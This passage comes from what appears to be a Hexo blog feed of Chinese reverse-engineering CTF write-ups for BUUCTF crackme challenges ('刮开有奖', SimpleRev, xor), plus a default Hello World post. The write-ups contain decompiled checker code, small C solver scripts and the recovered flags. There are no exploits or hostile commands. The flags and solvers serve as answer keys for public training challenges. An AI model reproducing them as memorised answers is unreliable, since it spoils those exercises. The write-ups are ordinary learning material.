class="number">103</span>&#125;;</span><br><span class="line">    sub_4010F0(v9, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">11</span>;j++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,v9[j]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_4010F0</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> v5;</span><br><span class="line">    <span class="keyword">int</span> v6;</span><br><span class="line">    result = a3;</span><br><span class="line">    <span class="keyword">for</span> ( i = a2; i &lt;= a3; a2 = i )</span><br><span class="line">    &#123;</span><br><span class="line">        v5 = i;</span><br><span class="line">        v6 = a1[i];</span><br><span class="line">        <span class="keyword">if</span> ( a2 &lt; result &amp;&amp; i &lt; result )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( v6 &gt; a1[result] )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    ++i;</span><br><span class="line">                    a1[v5] = a1[result];</span><br><span class="line">                    <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">while</span> ( a1[i] &lt;= v6 )</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( ++i &gt;= result )</span><br><span class="line">                        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    v5 = i;</span><br><span class="line">                    a1[result] = a1[i];</span><br><span class="line">                &#125;</span><br><span class="line">                --result;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( i &lt; result );</span><br><span class="line">        &#125;</span><br><span class="line">    LABEL_13:</span><br><span class="line">        a1[result] = v6;</span><br><span class="line">        sub_4010F0(a1, a2, i - <span class="number">1</span>);</span><br><span class="line">        result = a3;</span><br><span class="line">        ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/3.png"></p><p>接着查看函数sub_401000</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">BOOL __userpurge DialogFunc@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;edi&gt;, <span class="keyword">int</span> a2@&lt;esi&gt;, HWND hDlg, UINT a4, WPARAM a5, LPARAM a6)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v6; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v7; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+4h] [ebp-20030h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+8h] [ebp-2002Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp+Ch] [ebp-20028h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [esp+10h] [ebp-20024h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+14h] [ebp-20020h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+18h] [ebp-2001Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+1Ch] [ebp-20018h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [esp+20h] [ebp-20014h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [esp+24h] [ebp-20010h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [esp+28h] [ebp-2000Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp+2Ch] [ebp-20008h]</span></span><br><span class="line">  CHAR String; <span class="comment">// [esp+30h] [ebp-20004h]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [esp+31h] [ebp-20003h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [esp+32h] [ebp-20002h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [esp+33h] [ebp-20001h]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [esp+34h] [ebp-20000h]</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [esp+10030h] [ebp-10004h]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [esp+10031h] [ebp-10003h]</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [esp+10032h] [ebp-10002h]</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// [esp+20028h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [esp+2002Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  __alloca_probe();</span><br><span class="line">  <span class="keyword">if</span> ( a4 == <span class="number">272</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v29 = a2;</span><br><span class="line">  v28 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a4 != <span class="number">273</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a5 == <span class="number">1001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;String, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">    GetDlgItemTextA(hDlg, <span class="number">1000</span>, &amp;String, <span class="number">0xFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;String) == <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="number">90</span>;</span><br><span class="line">      v10 = <span class="number">74</span>;</span><br><span class="line">      v11 = <span class="number">83</span>;</span><br><span class="line">      v12 = <span class="number">69</span>;</span><br><span class="line">      v13 = <span class="number">67</span>;</span><br><span class="line">      v14 = <span class="number">97</span>;</span><br><span class="line">      v15 = <span class="number">78</span>;</span><br><span class="line">      v16 = <span class="number">72</span>;</span><br><span class="line">      v17 = <span class="number">51</span>;</span><br><span class="line">      v18 = <span class="number">110</span>;</span><br><span class="line">      v19 = <span class="number">103</span>;</span><br><span class="line">      sub_4010F0(&amp;v9, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">      <span class="built_in">memset</span>(&amp;v25, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v6 = sub_401000(&amp;v25, <span class="built_in">strlen</span>(&amp;v25));</span><br><span class="line">      <span class="built_in">memset</span>(&amp;v25, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v26 = v23;</span><br><span class="line">      v25 = v22;</span><br><span class="line">      v27 = v24;</span><br><span class="line">      v7 = sub_401000(&amp;v25, <span class="built_in">strlen</span>(&amp;v25));</span><br><span class="line">      <span class="keyword">if</span> ( String == v9 + <span class="number">34</span></span><br><span class="line">        &amp;&amp; v21 == v13</span><br><span class="line">        &amp;&amp; <span class="number">4</span> * v22 - <span class="number">141</span> == <span class="number">3</span> * v11</span><br><span class="line">        &amp;&amp; v23 / <span class="number">4</span> == <span class="number">2</span> * (v16 / <span class="number">9</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v6, <span class="string">&quot;ak1w&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v7, <span class="string">&quot;V1Ax&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        MessageBoxA(hDlg, <span class="string">&quot;U g3t 1T!&quot;</span>, <span class="string">&quot;@_@&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a5 != <span class="number">1</span> &amp;&amp; a5 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  EndDialog(hDlg, a5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/4.png"></p><p>我们可以猜测这里应该是base64加密。</p><h2 id="3-得出flag"><a href="#3-得出flag" class="headerlink" title="3.得出flag"></a>3.得出flag</h2><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/8.png"></p><p>string是一个8位的数组，再结合最开始的定义：</p><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/5.png"></p><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/6.png"></p><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/7.png"></p><p>而且v22-v24压入了同一处，v25-v27压入了同一处。<br>之后将”ak1w”和”V1Ax”进行base64解密。前三个为ak1w的，后三个为V1Ax的。</p><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/9.png"></p><p>将这些字符拼接再一起就是flag。<br>由于v7是经v22、v23、v24得来的，所WP1先输入，jMp后输入。</p><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/10.png"></p><p>flag{UJWP1jMp}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/01/19/hello-world/"/>
      <url>/2021/01/19/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><a id="more"></a><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假第一周</title>
      <link href="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/"/>
      <url>/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a>SimpleRev</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#SimpleRev">题目链接</a><br>查看文件信息</p><p><img src="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/SimpleRev_1.png"></p><p><img src="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/SimpleRev_2.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">Decry</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+Fh] [rbp-51h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)src = &#x27;SLCDN&#x27;;</span><br><span class="line">  v7 = <span class="number">0L</span>L;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = &#x27;wodah&#x27;;</span><br><span class="line">  v10 = <span class="number">0L</span>L;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  text = (<span class="keyword">char</span> *)join(key3, &amp;v9);               <span class="comment">// text=killshadow</span></span><br><span class="line">  <span class="built_in">strcpy</span>(key, key1);                            <span class="comment">// key=ADSFKDNCLS</span></span><br><span class="line">  <span class="built_in">strcat</span>(key, src);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  getchar();</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(key);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( key[v3 % v5] &gt; <span class="number">64</span> &amp;&amp; key[v3 % v5] &lt;= <span class="number">90</span> )<span class="comment">// 大写变小写</span></span><br><span class="line">      key[i] = key[v3 % v5] + <span class="number">32</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input your flag:&quot;</span>, src);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 &lt;= <span class="number">96</span> || v1 &gt; <span class="number">122</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v1 &gt; <span class="number">64</span> &amp;&amp; v1 &lt;= <span class="number">90</span> )</span><br><span class="line">          str2[v2] = (v1 - <span class="number">39</span> - key[v3++ % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        str2[v2] = (v1 - <span class="number">39</span> - key[v3++ % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(text, str2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个伪代码就是将key由大写变为小写，即key = “ADSFKNDCLS”。<br>然后输入v1，我们对v1进行运算得到str2，将str2与text比较相同就正确。这里v1就是flag，我们知道str2，所以对v1进行逆运算，以下为脚本。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> text[]=<span class="string">&quot;killshadow&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> key[]=<span class="string">&quot;adsfkndcls&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> v5 = <span class="built_in">strlen</span>(key),i,j,v3=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> flag[v5];</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( key[v3 % v5] &gt; <span class="number">64</span> &amp;&amp; key[v3 % v5] &lt;= <span class="number">90</span> )</span><br><span class="line">            key[i] = key[v3 % v5] + <span class="number">32</span>;</span><br><span class="line">        ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;v5;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            flag[i] = text[i] - <span class="number">97</span> + <span class="number">26</span>*j + <span class="number">39</span> <span class="number">-97</span> + key[i];</span><br><span class="line">            <span class="keyword">if</span>(flag[i] &gt;= <span class="number">65</span> &amp;&amp; flag[i] &lt;= <span class="number">90</span>)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,flag[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/SimpleRev_3.png"></p><p>最后在外面套上falg。</p><h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><p><a href="https://buuoj.cn/challenges#xor">题目链接</a><br>查看文件信息</p><p><img src="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/xor_1.png"></p><p>ida查看main函数伪代码</p><p><img src="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/xor_2.png"></p><p>意思就是输入33个字符，后一位与前一位进行异或运算，异或后的结果与global比较，相同则成功。我们对global进行逆运算，得出的即是flag。两次异或会还原，所以异或的逆运算还是异或。<br>下面为脚本。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> v6[<span class="number">33</span>];</span><br><span class="line">    <span class="keyword">char</span> global[<span class="number">33</span>]=&#123;<span class="string">&#x27;f&#x27;</span>,<span class="number">0xA</span>,<span class="string">&#x27;k&#x27;</span>,<span class="number">0xC</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="number">0x11</span>,<span class="string">&#x27;x&#x27;</span>,<span class="number">0x0D</span>,<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="number">0x11</span>,<span class="string">&#x27;p&#x27;</span>,<span class="number">0x19</span>,<span class="string">&#x27;F&#x27;</span>,<span class="number">0x1F</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="number">0x0E</span>,<span class="string">&#x27;g&#x27;</span>,<span class="number">6</span>,<span class="string">&#x27;h&#x27;</span>,<span class="number">0x0F</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;O&#x27;</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; <span class="number">33</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        v6[i] =global[i] ^ global[i - <span class="number">1</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,v6[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/xor_4.png"></p><p>第一位f是不运算的，抄上就行了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二周学习与做题记录</title>
      <link href="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
